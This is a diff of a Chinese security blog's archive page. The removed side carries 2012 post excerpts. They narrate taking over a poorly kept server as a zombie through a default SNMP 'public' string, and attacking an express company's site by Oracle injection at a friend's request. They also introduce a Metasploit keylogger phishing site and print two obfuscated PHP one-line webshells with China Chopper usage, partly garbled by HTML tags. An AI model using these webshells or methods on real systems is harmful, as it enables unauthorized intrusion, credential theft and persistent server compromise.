@@ -1,281 +1,274 @@
-<!DOCTYPE html>
-<html>
 
+  <!DOCTYPE HTML>
+<html  xmlns:wb="http://open.weibo.com/wb">
 <head>
-  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-  <title>Archives | Blog of Secer</title>
-  <meta name="description" content="" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="MobileOptimized" content="320" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
-  <link rel="stylesheet" type="text/css" href="/css/style.css" />
-  <meta name="generator" content="Blog of Secer">
-
+  <meta charset="UTF-8">
   
-  
-  
-
-  
+    <title>Archives | Blog of Secer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Secer">
+    
+    <meta name="description" content="记录互联网安全历程与个人成长经历">
+    
+    
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="333" />
+    <meta name="twitter:title" content="Archives | Blog of Secer" />
+      
+    
+    
+    <link rel="alternate" href="atom.xml" title="Blog of Secer" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
 </head>
 
-<!--
-<body class="home-template">
--->
-<body class="home-template">
-<div id="perspective" class="perspective effect-movedown">
-  <div class="container">
-    <!-- wrapper -->
-    <div class="wrapper">
+    <body>
+      <header>
+        <div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Blog of Secer">Blog of Secer</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives">文章</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+						<li><a href="/atom.xml">RSS订阅</a></li>
+					
+					<li>
+					
+					<form class="search" action="/search/index.html" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="30" placeholder="Search" />
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
 
-      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
-    <div class="vertical">
-        <div class="site-head-content inner">
-             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
-            <h1 class="blog-title">Blog of Secer</h1>
-            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
-        </div>
-    </div>
-</header>
+      </header>
+      <div id="container">
+        
 
-      
-<main class="content" role="main">
+<div class="archive-title" >
+  <h2 class="archive-icon">Archives</h2>
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-14T04:41:27.000Z" itemprop="datePublished">
-          2012-06-14
-      </time>
-    
-    
-    | 
-    <a href='/tag/入侵/'>入侵</a>,
-    
-    <a href='/tag/snmp/'>snmp</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/522.seo/">snmp弱口令在一次常规入侵中的应用</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>常常见到论坛里面或qq里面有人问snmp的若口令怎么利用，其实网上已经有了一些关于snmp弱口令的介绍，无奈的是，我还没有看到谁做过教程，刚好这次入侵过程中snmp弱口令给了我很大的启发，于是就把他写了下来，希望给大家一些启发。</p>  <p>最近看到某个主页做得很烂，似乎很长时间没有做过维护了，不巧他的网速很快，于是我有了把他做成肉鸡的念头。首先当然是刺探信息了，开了x-scan,扫了一会儿，结果出来了：</p>  <p>主机地址</p>  <p>端口/服务</p>  <p>服务漏洞</p>  <p>202.<em>.</em>.<em> ftp (21/tcp) 发现安全提示</p>  <p>202.</em>.<em>.</em> telnet (23/tcp) 发现安全提示</p>  <p>202.<em>.</em>.<em> unknown (1080/tcp) 发现安全提示</p>  <p>202.</em>.<em>.</em> www (80/tcp) 发现安全漏洞</p>  <p>202.<em>.</em>.<em> unknown (3389/tcp) 发现安全提示</p>  <p>202.</em>.<em>.</em> snmp (161/udp) 发现安全漏洞</p>  <p>漏洞 snmp (161/udp) Snmp口令: &quot;public&quot;</p>
-      
-      </p>
-      
-      <p>
-          <a href="/522.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+  <div class="archiveslist archive-float clearfix">
+   <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">2016年07月</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">2016年04月</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">2016年01月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">2015年10月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">2015年09月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">2015年07月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">2015年06月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/05/">2015年05月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/04/">2015年04月</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">2015年03月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/01/">2015年01月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/12/">2014年12月</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/10/">2014年10月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/09/">2014年09月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/08/">2014年08月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/07/">2014年07月</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/06/">2014年06月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/05/">2014年05月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/04/">2014年04月</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/03/">2014年03月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/02/">2014年02月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/01/">2014年01月</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/12/">2013年12月</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/11/">2013年11月</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/10/">2013年10月</a><span class="archive-list-count">18</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/09/">2013年09月</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/08/">2013年08月</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/07/">2013年07月</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/06/">2013年06月</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/05/">2013年05月</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/04/">2013年04月</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/03/">2013年03月</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/02/">2013年02月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2013/01/">2013年01月</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/12/">2012年12月</a><span class="archive-list-count">14</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/11/">2012年11月</a><span class="archive-list-count">28</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/10/">2012年10月</a><span class="archive-list-count">18</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/09/">2012年09月</a><span class="archive-list-count">25</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/08/">2012年08月</a><span class="archive-list-count">17</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/07/">2012年07月</a><span class="archive-list-count">26</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/06/">2012年06月</a><span class="archive-list-count">58</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/05/">2012年05月</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/04/">2012年04月</a><span class="archive-list-count">23</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/03/">2012年03月</a><span class="archive-list-count">13</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/02/">2012年02月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2012/01/">2012年01月</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/12/">2011年12月</a><span class="archive-list-count">11</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/11/">2011年11月</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/10/">2011年10月</a><span class="archive-list-count">21</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/09/">2011年09月</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/08/">2011年08月</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/07/">2011年07月</a><span class="archive-list-count">17</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2011/06/">2011年06月</a><span class="archive-list-count">7</span></li></ul>
+ </div>
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-13T22:52:02.000Z" itemprop="datePublished">
-          2012-06-14
-      </time>
-    
-    
-    | 
-    <a href='/tag/Metasploit/'>Metasploit</a>,
-    
-    <a href='/tag/窃听/'>窃听</a>,
-    
-    <a href='/tag/网络钓鱼/'>网络钓鱼</a>,
-    
-    <a href='/tag/keylogger/'>keylogger</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/519.seo/">如何利用Metasploit制造一个键盘窃听网站</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p><b>大家都应该知道网络钓鱼是什么吧，那么接下来这篇文章会来讲述如何利用</b><b>Metasploit</b><b>制造一个键盘窃听网站。</b></p>  <p><b>网络钓鱼的历史：</b></p>  <p>网络钓鱼技术始于1987年，于1995年被第一次发现。</p>  <p>攻击者通过钓鱼技术获取受害者的一些信息，包括用户名、密码、信用卡细节等等。   <br />一般来说，攻击者会制造一个假冒的网站诱惑受害者进入并输入他的信息，比如仿造gmail、雅虎、facebook的登录框。</p>  <p><b>Javascript keylogger</b><b>简介：</b></p>  <p>Javascript keylogger可以捕捉通过网络的键盘击键事件。   <br />使用JavaScript keylogger的优势在于：他不需要我们预先拥有一个服务器空间，然后再上传一个假冒的网页，写伪造的页面、插链接</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001[4]" border="0" alt="clip_image001[4]" src="http://img.cker.in/Metasploit_D0E0/clip_image0014.png" width="541" height="231" /></p>  <p>再写个蛋疼的采集脚本（如下图）…<img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002[4]" border="0" alt="clip_image002[4]" src="http://img.cker.in/Metasploit_D0E0/clip_image0024.png" width="585" height="144" /></p>  <p><b>使用</b><b>Metasploit</b><b>制造键盘窃听网站：</b></p>  <p>1. 打开msfconsle</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004[4]" border="0" alt="clip_image004[4]" src="http://img.cker.in/Metasploit_D0E0/clip_image0044.jpg" width="558" height="356" /></p>
-      
-      </p>
-      
-      <p>
-          <a href="/519.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+</div>
+<div id="main" class="archive-part clearfix">
+  <div id="archive-page">
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-13T09:06:02.000Z" itemprop="datePublished">
-          2012-06-13
-      </time>
-    
-    
-    | 
-    <a href='/tag/oracle注入/'>oracle注入</a>,
-    
-    <a href='/tag/渗透实例/'>渗透实例</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/516.seo/">对著名快递公司的一次艰难的oracle注入</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>作者：rebeyond</p>  <p>● 轻车熟路    <br />一个对新飞鸿有意见的亲密朋友找我说能不能把这个公司的网站给搞了，我一听公司，心想，企业站都是垃圾，好搞，便痛快答应（人品真好！），呵呵，但是后来才发现没我想像的那么简单。站面如图</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="image" border="0" alt="image" src="http://img.cker.in/oracle_F4A/image.png" width="314" height="366" /> </p>
-      
-      </p>
-      
-      <p>
-          <a href="/516.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <a href="/522.seo/" title="snmp弱口令在一次常规入侵中的应用" itemprop="url">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-13T09:01:56.000Z" itemprop="datePublished">
-          2012-06-13
-      </time>
+    <h1 itemprop="name">snmp弱口令在一次常规入侵中的应用</h1>
     
-    
-    | 
-    <a href='/tag/Group-By一个不常用的用法/'>Group By一个不常用的用法</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/514.seo/">Group By一个不常用的用法</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>乍一看，大家一定认为这有什么好写的呀，不就是group by 嘛，对指定列进行分组而已。我在这里说的是一个将被MS删除、不符合ISO语法的用法（大家可以在MS没有删除前显摆显摆嘛，至少2008没有删除）。好，那这是什么语法呢，那就是Group by ALL 。那它和不加ALL有什么差别呢？ 差别就是加了ALL后包含所有组和结果集，甚至包含那些其中任何行都不满足 WHERE 子句指定的搜索条件的组和结果集。注意的是指定了 ALL，将对组中不满足搜索条件的汇总列返回空值。 </p>
-      
-      </p>
-      
-      <p>
-          <a href="/514.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <time datetime="2012-06-14T04:41:27.000Z" itemprop="datePublished">2012-06-14</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-13T08:54:05.000Z" itemprop="datePublished">
-          2012-06-13
-      </time>
-    
-    
-    | 
-    <a href='/tag/ASP/'>ASP</a>,
-    
-    <a href='/tag/FSO/'>FSO</a>,
-    
-    <a href='/tag/ASP中FSO的神奇功能/'>ASP中FSO的神奇功能</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/512.seo/">ASP中FSO的神奇功能</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>在ASP中，FSO的意思是File System Object，即文件系统对象。 </p>  <p> 我们将要操纵的计算机文件系统，在这里是指位于web服务器之上。所以，确认你对此拥有合适的权限。理想情况下，你可以在自己的机器上建立一个web服务器，这样就能方便地进行测试。如果运行于Windows平台，请试一试微软公司的免费个人Web服务器PWS。 </p>  <p> FSO 模型对象 </p>  <p> Drive Object：驱动器对象 供存取磁盘或者网络驱动器    <br /> FileSystemObject Object：文件系统对象 供存取计算机的文件系统     <br /> Folder Object：文件夹对象 供存取文件夹的所有属性     <br /> TextStream Object：文本流对象 供存取文件内容 </p>  <p> 你可以使用上面的对象做计算机上的任何事情，也包括破坏活动 ;-( 所以，请小心使用FSO。在web环境中，存储信息是非常重要的，比如用户信息，日志文件，等等。FSO提供了一个强大且简单的方法高效率地保存数据。在这篇文章里面，着重讨论FileSystemObject和TextStream对象。 </p>  <p> FSO由微软公司提供支持，对于非Windows系统，大概不能再使用ASP。 </p>  <p> 怎么样使用FSO？ </p>  <p> 为了使用FSO来执行所有的工作，首先要创建对象，代码就象下面这样： </p>  <p>＜ % Set fso = Server.CreateObject(&quot;Scripting.FileSystemObject&quot;) % ＞ </p>
-      
-      </p>
-      
-      <p>
-          <a href="/512.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <a href="/519.seo/" title="如何利用Metasploit制造一个键盘窃听网站" itemprop="url">
   
-  <article class="post">
-    <header class="post-header">
-      <span class="post-meta">
-      <time datetime="2012-06-12T10:59:46.000Z" itemprop="datePublished">
-          2012-06-12
-      </time>
+    <h1 itemprop="name">如何利用Metasploit制造一个键盘窃听网站</h1>
     
-    
-    | 
-    <a href='/tag/一句话/'>一句话</a>
-    
-    
-</span>
-      <h2 class="post-title"><a href="/510.seo/">两个变形的一句话php马</a></h2>
-    </header>
-    <section class="post-excerpt">
-      <p>
-      
-        <p>在t00ls里论坛看到的，原来在<a href="http://www.t00ls.net/thread-18388-4-1.html。不过他们的楼上的方法都不好，我回复了一下，就是这样：">http://www.t00ls.net/thread-18388-4-1.html。不过他们的楼上的方法都不好，我回复了一下，就是这样：</a> </p>  <p>不过何必像楼上的生成文件再用哪么麻烦呢？   <br />第一种：1.php    <br />&lt; ?php ($_=@$<em>GET[2]).@$</em>($<em>POST[1])?&gt;    <br />我变了一下，在菜刀里写<a href="http://127.0.0.1:88/1.php?2=assert密码是1">http://127.0.0.1:88/1.php?2=assert密码是1</a>    <br />第二种2.php    <br />&lt; ?php    <br />$</em>=&quot;&quot;;    <br />$<em>[+&quot;&quot;]=’’;    <br />$</em>=&quot;$<em>&quot;.&quot;&quot;;    <br />$</em>=($<em>[+&quot;&quot;]|&quot;&quot;).($</em>[+&quot;&quot;]|&quot;&quot;).($<em>[+&quot;&quot;]^&quot;&quot;);    <br />?&gt;    <br />&lt; ?php ${‘</em>‘.$<em>}[‘</em>‘](${‘<em>‘.$</em>}[‘<strong>‘]);?&gt; </p>  <p>在菜刀里写   <br />&lt;a href=”<a href="http://127.0.0.1:88/3.php?_=assert&amp;amp">http://127.0.0.1:88/3.php?_=assert&amp;amp</a>;</strong>=eval(“&gt;<a href="http://127.0.0.1:88/3.php?_=assert&amp;__=eval(">http://127.0.0.1:88/3.php?_=assert&amp;__=eval(</a></a>$_POST[‘pass’]) 密码是pass </p>  <p>这两种就可以直接用菜刀了。   <br />不过我是直接写在url里，如果你用菜刀的附加数据的话更隐蔽，因为是post提交的。</p>
-      
-      </p>
-      
-      <p>
-          <a href="/510.seo/" class="excerpt-link">Read More...</a>
-      </p>
-      
-    </section>
-  </article>
+    <time datetime="2012-06-13T22:52:02.000Z" itemprop="datePublished">2012-06-14</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
   
-  <nav class="pagination" role="pagination">
-    <a class="newer-posts" href="/archives/page/54/">← Newer Posts</a>
-    <span class="page-number">Page 55 of 81</span>
-    <a class="older-posts" href="/archives/page/56/">Older Posts →</a>
+    <a href="/516.seo/" title="对著名快递公司的一次艰难的oracle注入" itemprop="url">
+  
+    <h1 itemprop="name">对著名快递公司的一次艰难的oracle注入</h1>
+    
+    <time datetime="2012-06-13T09:06:02.000Z" itemprop="datePublished">2012-06-13</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/514.seo/" title="Group By一个不常用的用法" itemprop="url">
+  
+    <h1 itemprop="name">Group By一个不常用的用法</h1>
+    
+    <time datetime="2012-06-13T09:01:56.000Z" itemprop="datePublished">2012-06-13</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/512.seo/" title="ASP中FSO的神奇功能" itemprop="url">
+  
+    <h1 itemprop="name">ASP中FSO的神奇功能</h1>
+    
+    <time datetime="2012-06-13T08:54:05.000Z" itemprop="datePublished">2012-06-13</time>
+  </a>
+</section>
+
+  <section class="post" itemscope itemprop="blogPost">
+  
+    <a href="/510.seo/" title="两个变形的一句话php马" itemprop="url">
+  
+    <h1 itemprop="name">两个变形的一句话php马</h1>
+    
+    <time datetime="2012-06-12T10:59:46.000Z" itemprop="datePublished">2012-06-12</time>
+  </a>
+</section>
+
+
+  <nav id="page-nav" class="clearfix archive-nav">
+    <a class="extend prev" rel="prev" href="/archives/page/54/">&laquo; 上一页</a><a class="page-number" href="/archives/">1</a><span class="space">&hellip;</span><a class="page-number" href="/archives/page/53/">53</a><a class="page-number" href="/archives/page/54/">54</a><span class="page-number current">55</span><a class="page-number" href="/archives/page/56/">56</a><a class="page-number" href="/archives/page/57/">57</a><span class="space">&hellip;</span><a class="page-number" href="/archives/page/81/">81</a><a class="extend next" rel="next" href="/archives/page/56/">下一页 &raquo;</a>
   </nav>
-</main>
 
-
-      
-<footer class="site-footer">
-  
-  <div class="inner">
-     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
-     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
   </div>
+</div>
+
+      </div>
+      <footer><div id="footer" >
+	
+	
+	<section class="info">
+		<p> 没有礁石，就没有美丽的浪花；没有挫折，就没有壮丽的人生！ <br/>
+			再长的路，一步步也能走完，再短的路，不迈开双脚也无法到达，平凡的脚步也可以走完伟大的行程！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		<a href="http://weibo.com/111" target="_blank" title="weibo"></a>
+		
+		
+		<a href="https://twitter.com/333" target="_blank" title="twitter"></a>
+		
+		
+		<a href="https://github.com/333" target="_blank" title="github"></a>
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="pacman">pacman</a> © 2016 
+		
+		<a href="http://ha.cker.in" target="_blank" title="Secer">Secer</a>
+		
+		</p>
+</div>
 </footer>
+      <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
 
-      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
-
-<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
-<script type="text/javascript" src="/js/index.js"></script>
-<script type="text/javascript" src="/js/menu.js"></script>
 
 
 
 
 
-  </div>
+
+
+
+
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F77edef7e6931022edbd2322ec66456e1' type='text/javascript'%3E%3C/script%3E"));
+</script>
+
+<div id="totop" style="position:fixed;bottom:150px;right:50px;cursor: pointer;">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
 </div>
+<script type="text/javascript">
+	(function($) { 
+		// When to show the scroll link
+		// higher number = scroll link appears further down the page   
+		var upperLimit = 300;
+		
+		// Our scroll link element
+		var scrollElem = $('#totop');
+	   
+		// Scroll to top speed
+		var scrollSpeed = 800;
+	   
+		// Show and hide the scroll to top link based on scroll position   
+		scrollElem.hide();
+		$(window).scroll(function () {            
+			var scrollTop = $(document).scrollTop();       
+			if ( scrollTop > upperLimit ) {
+				$(scrollElem).stop().fadeTo(300, 1); // fade back in           
+			}else{       
+				$(scrollElem).stop().fadeTo(300, 0); // fade out
+			}
+		});
+		// Scroll to top animation on click
+		$(scrollElem).click(function(){
+			$('html, body').animate({scrollTop:0}, scrollSpeed); return false;
+		});
+	})(jQuery);
+</script>
 
-<nav  class="outer-nav top horizontal">
 
-          <a class="icon-home"  href="/"><span>Home</span></a>
+    </body>
+   </html>
 
-          <a class="icon-news"  href="/archives"><span>Archive</span></a>
-
-          <a class="icon-image"  href="/images"><span>Images</span></a>
-
-          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
-
-          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
-
-          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
-
-</nav>
-
-</div>
-</body>
-</html>
